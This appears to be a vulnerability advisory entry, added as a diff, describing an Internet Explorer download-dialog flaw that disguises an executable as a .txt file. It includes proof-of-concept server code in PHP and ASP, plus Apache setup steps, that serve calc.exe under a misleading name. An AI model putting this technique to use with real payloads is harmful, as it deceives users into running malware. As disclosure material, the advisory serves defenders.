@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/3597/info
+
+It is possible for a malicious webmaster, hosting files on an website, to spoof file extensions for users of Internet Explorer. For example, an .exe file can be made to look like a .txt (or other seemingly harmless file type) file in the Download dialog.
+
+When including a certain string of characters between the filename and the actual file extension, IE will display the specified misleading file extension type.
+
+The end result is that a malicious webmaster is able to entice a user to open or save arbitrary files to their local system.
+
+* It has been reported that patched systems may still be vulnerable to this issue. If the attacker composes a .hta file, using the methods described above, it is possible for the malicious file to go undetected by patched systems. 
+
+With an apache/php server add .txt to the already existing .php extension in the apache.conf file, so that apache will recognise .txt extensions as php script files.
+
+1. Copy the real windows calc.exe from a windows system to the html root dir.
+
+2. Copy the readme.txt file below to the same html root dir.
+
+3. go to the url http://yourserver/readme.txt
+
+You will see the same behavior mentioned in the previous alert.
+
+FILE <readme.txt> BEGIN ----
+<?php
+Header("Content-type: application/octet-stream");
+Header("Content-Disposition: attachment; filename=calc.exe");
+readfile("calc.exe");
+?>
+FILE <readme.txt> END ----
+
+"Jonathan G. Lampe" <jonathan@stdnet.com> submitted this example in ASP for IIS webservers:
+
+<%
+
+Const adTypeBinary = 1
+Dim strFilePath
+
+Response.ContentType = "application/octet-stream"
+Response.AddHeader "Content-Disposition","attachment; filename=calc.exe"
+
+strFilePath = Server.MapPath(".") & "\calc.exe"
+
+Set objStream = Server.CreateObject("ADODB.Stream")
+objStream.Open
+objStream.Type = adTypeBinary
+objStream.LoadFromFile strFilePath
+
+Response.BinaryWrite objStream.Read
+
+objStream.Close
+Set objStream = Nothing
+
+%> 
